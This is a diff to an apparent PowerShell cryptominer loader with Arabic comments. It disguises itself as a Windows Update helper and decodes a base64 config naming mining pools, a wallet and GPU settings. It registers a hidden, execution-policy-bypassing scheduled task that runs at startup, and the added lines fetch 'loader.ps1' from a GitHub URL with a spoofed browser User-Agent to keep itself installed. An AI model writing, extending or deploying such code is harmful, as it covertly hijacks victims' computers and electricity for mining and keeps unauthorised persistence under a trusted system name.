@@ -16,9 +16,20 @@ $selfPath = "$themeDir\WinUpdateHelper.ps1"
 $configB64 = "eyJwb29scyI6W3sidXJsIjoic3RyYXR1bSt0Y3A6Ly8xNDYuNTkuMTU2LjEyMDo4MCIsInVzZXIiOiIzY1VxOEFaNWhVbXBnbWRFZk1pS2dlRXFSMlB2b0VwdUhBUWpqWEZmWXZDZjlRTFRjUWpuRyIsInBhc3MiOiJ4Iiwic3NsIjpmYWxzZX0seyJ1cmwiOiJzdHJhdHVtK3RjcDovLzUxLjc5LjY1LjEzOTo4MCIsInVzZXIiOiIzY1VxOEFaNWhVbXBnbWRFZk1pS2dlRXFSMlB2b0VwdUhBUWpqWEZmWXZDZjlRTFRjUWpuRyIsInBhc3MiOiJ4Iiwic3NsIjpmYWxzZX1dLCJ3YWxsZXQiOiIzY1VxOEFaNWhVbXBnbWRFZk1pS2dlRXFSMlB2b0VwdUhBUWpqWEZmWXZDZjlRTFRjUWpuRyIsIndvcmtlciI6ImNhZmVfbm9kZV8wMSIsImFsZ28iOiJibGFrZTMiLCJwbGF0Zm9ybXMiOlsibnZpZGlhIl0sImludGVuc2l0eSI6NjAsImZhbi1zcGVlZCI6NjUsInRlbXAtbGltaXQiOjc1LCJsb2ctZmlsZSI6IiIsImFwaS1iaW5kIjoiIn0="
 [System.IO.File]::WriteAllText($configPath, [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($configB64)))
 
-# 4. إنشاء مهمة مجدولة للاستيقاظ الذاتي (بعد كل إعادة تشغيل)
+# 4. إنشاء مهمة مجدولة + كتابة السكريبت بشكل دائم (تصحيح خطأ النسخ من الذاكرة)
 $taskName = "WindowsUpdateAssistant"
-if (-not (Test-Path $selfPath)) { Copy-Item $PSCommandPath $selfPath -Force }
+if (-not (Test-Path $selfPath)) {
+    # إعادة سحب السكريبت من المصدر الأصلي لضمان وجوده دائماً بعد الإعادة
+    $wc = New-Object Net.WebClient
+    $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+    try {
+        $wc.DownloadFile("https://raw.githubusercontent.com/awsmeawschees/bbnn/main/loader.ps1", $selfPath)
+    } catch {
+        # Fallback: إذا فشل السحب، ينشئ ملفاً فارغاً لمنع تكرار المحاولة الفاشلة
+        New-Item -Path $selfPath -ItemType File -Force | Out-Null
+    }
+}
+
 if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
     $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-w hidden -ep bypass -file `"$selfPath`""
     $trigger = New-ScheduledTaskTrigger -AtStartup
